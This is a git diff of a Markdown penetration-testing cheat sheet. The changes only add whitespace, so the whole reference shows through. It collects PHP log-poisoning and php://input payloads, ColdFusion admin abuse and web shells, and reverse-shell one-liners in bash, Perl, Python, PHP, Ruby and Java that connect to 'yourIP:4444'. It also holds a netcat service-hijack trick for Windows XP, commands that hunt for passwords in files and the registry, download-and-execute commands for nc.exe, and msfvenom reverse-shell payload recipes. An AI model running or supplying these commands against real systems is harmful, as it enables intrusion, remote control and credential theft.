@@ -64,47 +64,47 @@ GET /<?php system($_GET["cmd"]);?>
 
 ```
 
-* auth.log + LFI
+* auth.log + LFI     
 `ssh <?php system($_GET["cmd"]);?>@targetIP` and then LFI `/var/log/auth.log`
 
-* /var/mail + LFI
+* /var/mail + LFI     
 `mail -s "<?php system($_GET["cmd"]);?>" someuser@targetIP < /dev/null` 
 
-* php expect
+* php expect     
 `index.php?somevar=expect://ls`
 
-* php input
+* php input     
 `curl -X POST "targetIP/index.php?somevar=php://input" --data '<?php system("curl -o cmd.php yourIP/cmd.txt");?>'`
 Then access `targetIP/cmd.php`
 
 ### ColdFusion
 
 
-* is it Enterprise or Community?
+* is it Enterprise or Community?     
 Check how it handles `.jsp` files  `curl targetIP/blah/blah.jsp`. If 404 - enterprise, 500 - community.
 
-* which version?
+* which version?     
 `/CFIDE/adminapi/base.cfc?wsdl` has a useful comment indicating exact version
 
-* common XEE
+* common XEE     
 https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf
 
-* LFI in admin login locale
+* LFI in admin login locale     
 `/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\lib\password.properties` - may need full path. They can be obtained with help of  `/CFIDE/componentutils/cfexplorer.cfc`
 
-* Local upload and execution
+* Local upload and execution     
 Once access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.
 
 `Debugging & Logging` -> `Scheduled Tasks` -> url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.
   
 To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<some URL>, Probe fail - fail if probe does not contain "blahblah", Execute program <path to our downloaded exe>. And then run probe manually.
   
-* Files worth grabbing
+* Files worth grabbing     
 ** CF7 \lib\neo-query.xml
 ** CF8 \lib\neo-datasource.xml
 ** CF9 \lib\neo-datasource.xml
 
-* Simple remote CFM shell
+* Simple remote CFM shell     
 ```
 <html>
 <body>
@@ -115,7 +115,7 @@ To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<so
 </html>
 ```
 
-* Simple remote shell using Java (if CFEXECUTE is disabled)
+* Simple remote shell using Java (if CFEXECUTE is disabled)     
 ```
 <cfset runtime = createObject("java",
 "java.lang.System")>
@@ -127,26 +127,26 @@ To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<so
 
 ## Reverse Shell Howto
 
-* Bash
+* Bash     
 `bash -i >& /dev/tcp/yourIP/4444 0>&1`
 
-* Perl Linux
+* Perl Linux     
 `perl -e 'use Socket;$i="yourIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
-* Perl Windows
+* Perl Windows     
 `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"yourIP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
 
 
-* Python
+* Python     
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("yourIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-* PHP
+* PHP     
 `php -r '$sock=fsockopen("yourIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
-* Ruby
+* Ruby     
 `ruby -rsocket -e'f=TCPSocket.open("yourIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
 
-* Java (Linux)
+* Java (Linux)     
 ```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/yourIP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -162,49 +162,49 @@ And on your side authorize the connection with `xhost +targetIp` and catch it wi
 
 ## Interactive Shell Howto
 
-* Python (Linux)
+* Python (Linux)     
 `python -c 'import pty; pty.spawn("/bin/bash")' `
 
-* Python (Windows)
+* Python (Windows)     
 `c:\python26\python.exe -c 'import pty; pty.spawn("c:\\windows\\system32\\cmd.exe")' `
 
 ## Inside Windows
 
-* Get version
+* Get version     
 `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
 
-* Get users
+* Get users     
 `net users`
 
-* Get user info
+* Get user info     
 `net user <username>`
 
 
-* Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)
+* Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)     
 `netstat -ano`
 
-* Firewall status
+* Firewall status     
 `netsh firewall show state`    
 `netsh firewall show config`
 
-* Scheduled tasks
+* Scheduled tasks     
 List - `schtasks /query /fo LIST /v`    
 Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`     
 Run - `schtasks /Run /TN mytask`    
 Delete - `schtasks /Delete /TN mytask`    
 
-* Running tasks
+* Running tasks     
 List - `tasklist /SVC`    
 Kill - `taskkill /IM <exe name> /F`    
 Kill - `taskkill /PID <pid> /F`     
 
-* Services
+* Services     
 List - `net start`     
 Long name to key name `sc getkeyname "long name"`     
 Details - `sc qc <key name>`     
 Config - `sc config <key name> `    
 
-* Low hanging fruits to grab
+* Low hanging fruits to grab     
 ```
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
@@ -212,40 +212,40 @@ c:\sysprep\sysprep.xml
 %WINDIR%\Panther\Unattended.xml
 ```
 
-* Installers are running as elevated?
+* Installers are running as elevated?     
 `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`    
 `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`    
 
-* Find interesting files
+* Find interesting files     
 `dir /s *pass* == *cred* == *vnc* == *.config*`     
 `findstr /si password *.xml *.ini *.txt`     
 
-* Find interesting registry entries
+* Find interesting registry entries     
 `reg query HKLM /f password /t REG_SZ /s`     
 `reg query HKCU /f password /t REG_SZ /s`     
 
-* Permissions
+* Permissions     
 Check detail on service - `accesschk.exe /accepteula -ucqv <service name>`     
 Find modifiable services - `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`     
                            `accesschk.exe /accepteula -uwcqv "Users" *`     
-Folder permissions - `accesschk.exe -dqv <path>`     
+Folder permissions - `accesschk.exe -dqv <path>`          
 `cacls <path>`     
 `icacls <path\file`     
                            
-* Qick win on WinXP SP0/1  
+* Qick win on WinXP SP0/1       
 `sc config upnphost binpath= "C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe"`     
 `sc config upnphost obj= ".\LocalSystem" password= ""`     
 `sc config upnphost depend= ""`     
 `net stop upnphost`     
 `net start upnphost`     
 
-* Quick wins
+* Quick wins     
 `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`     
 `reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`     
 `reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`     
 `reg query "HKCU\Software\ORL\WinVNC3\Password"`     
 
-* Download file with VBS
+* Download file with VBS     
 ```
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
@@ -260,17 +260,17 @@ with bStrm
 end with
 ```
 
-* Download with Powershell 3+
+* Download with Powershell 3+     
 `powershell -NoLogo -Command "Invoke-WebRequest -Uri 'https://yourIP/nc.exe' -OutFile 'c:\Users\Public\Downloads\nc.exe'"`
 
-* Download with Powershell 2
+* Download with Powershell 2     
 `powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\Users\Public\Download\nc.exe')"`
 
-* Download with Python
+* Download with Python     
 `c:\Python26\python.exe -c "import urllib; a=open('nc.exe', 'wb'); a.write(urllib.urlopen('http://yourIP/nc.exe').read()); a.flush();a.close()" ` 
 
 
-* Windows specific LPE vulns
+* Windows specific LPE vulns     
 - https://www.exploit-db.com/exploits/11199/
 - https://www.exploit-db.com/exploits/18176/
 - https://www.exploit-db.com/exploits/15609/
@@ -279,7 +279,7 @@ end with
 
 ## Inside Linux
 
-* Basic enumeration
+* Basic enumeration     
 System info `uname -a`     
 Arch `uname -m`     
 Kernel `cat /proc/version	`     
@@ -338,51 +338,51 @@ msfvenom -l
 
 ### Binaries
 
-* Linux
+* Linux     
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
 
-* Windows
+* Windows     
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
 
-* Mac
+* Mac     
 `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
 
 ### Web Payloads
 
-* PHP
+* PHP     
 `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
 `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
 
-* ASP
+* ASP     
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
 
-* JSP
+* JSP     
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
 
-* WAR
+* WAR     
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
 
 ### Scripting Payloads
 
-* Python
+* Python     
 `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
 
-* Bash
+* Bash     
 `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
 
-* Perl
+* Perl     
 `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
 
 ### Shellcode
 For all shellcode see `msfvenom –help-formats` for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
 
-* Linux Based Shellcode
+* Linux Based Shellcode     
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
-* Windows Based Shellcode
+* Windows Based Shellcode     
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
-* Mac Based Shellcode
+* Mac Based Shellcode     
 `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
 
